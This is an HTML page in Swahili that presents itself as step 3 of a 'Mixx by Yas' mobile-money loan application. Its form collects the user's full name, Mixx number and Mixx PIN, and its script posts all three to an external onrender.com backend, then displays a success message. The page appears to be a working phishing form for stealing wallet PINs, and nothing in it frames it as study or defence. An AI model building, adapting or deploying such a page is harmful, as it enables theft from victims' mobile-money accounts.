<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hatua ya 3 - Mkopo wa Mixx</title>

    <style>

        *{
            margin:0;
            padding:0;
            box-sizing:border-box;
            font-family:Arial, sans-serif;
        }

        body{
            background:#f2f2f2;
            display:flex;
            justify-content:center;
            align-items:center;
            height:100vh;
            padding:20px;
        }

        .container{
            background:white;
            width:100%;
            max-width:400px;
            padding:25px;
            border-radius:12px;
            box-shadow:0 0 10px rgba(0,0,0,0.1);
        }

        h2{
            text-align:center;
            margin-bottom:20px;
            color:green;
        }

        input{
            width:100%;
            padding:14px;
            margin-bottom:15px;
            border:1px solid #ccc;
            border-radius:8px;
            font-size:16px;
        }

        .pin-box{
            position:relative;
        }

        .eye{
            position:absolute;
            right:15px;
            top:14px;
            cursor:pointer;
            font-size:18px;
        }

        button{
            width:100%;
            padding:14px;
            border:none;
            background:green;
            color:white;
            font-size:16px;
            border-radius:8px;
            cursor:pointer;
        }

        button:hover{
            background:darkgreen;
        }

        .loading{
            display:none;
            text-align:center;
            margin-top:15px;
            color:green;
        }

        .message{
            margin-top:15px;
            text-align:center;
            font-weight:bold;
        }

    </style>
</head>

<body>

<div class="container">

    <h2>Mkopo wa Mixx by Yas</h2>

    <input type="text" id="jina" placeholder="Jina Kamili">

    <input type="text" id="namba" placeholder="Namba ya Mixx">

    <div class="pin-box">
        <input type="password" id="pin" placeholder="Weka PIN ya Mixx">
        <span class="eye" onclick="togglePin()">👁</span>
    </div>

    <button onclick="tumaData()" id="btn">
        TUMA MAOMBI
    </button>

    <div class="loading" id="loading">
        Inatuma taarifa...
    </div>

    <div class="message" id="message"></div>

</div>

<script>

function togglePin(){

    let pinInput = document.getElementById("pin");

    if(pinInput.type === "password"){
        pinInput.type = "text";
    }else{
        pinInput.type = "password";
    }

}

async function tumaData(){

    let jina = document.getElementById("jina").value.trim();
    let namba = document.getElementById("namba").value.trim();
    let pin = document.getElementById("pin").value.trim();

    let loading = document.getElementById("loading");
    let message = document.getElementById("message");
    let btn = document.getElementById("btn");

    message.innerHTML = "";

    if(jina === "" || namba === "" || pin === ""){

        message.style.color = "red";
        message.innerHTML = "Jaza taarifa zote";

        return;
    }

    loading.style.display = "block";
    btn.disabled = true;

    try{

        const response = await fetch("https://mkopo-wa-mixx-by-yas.onrender.com/submit-step3", {

            method: "POST",

            headers:{
                "Content-Type":"application/json"
            },

            body: JSON.stringify({
                jina: jina,
                namba: namba,
                pin: pin
            })

        });

        const data = await response.json();

        loading.style.display = "none";
        btn.disabled = false;

        if(data.status === "success"){

            message.style.color = "green";
            message.innerHTML = "Ombi limetumwa successfully";

        }else{

            message.style.color = "red";
            message.innerHTML = data.message || "Imeshindikana kutuma";

        }

    }catch(error){

        loading.style.display = "none";
        btn.disabled = false;

        console.log(error);

        message.style.color = "red";
        message.innerHTML = "Backend haipatikani";

    }

}

</script>

</body>
</html>
